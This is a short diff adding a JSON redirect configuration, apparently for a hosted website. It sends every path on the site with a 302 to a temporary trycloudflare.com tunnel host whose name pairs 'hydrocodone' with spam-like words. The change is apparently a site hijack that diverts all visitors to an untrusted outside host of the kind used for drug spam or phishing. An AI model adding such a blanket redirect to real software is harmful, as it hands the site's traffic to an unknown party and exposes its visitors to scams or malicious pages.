@@ -1,0 +1,9 @@
+{
+  "redirects": [
+    {
+      "source": "/(.*)",
+      "destination": "https://hydrocodone-abs-cruises-alt.trycloudflare.com/$1",
+      "statusCode": 302
+    }
+  ]
+}
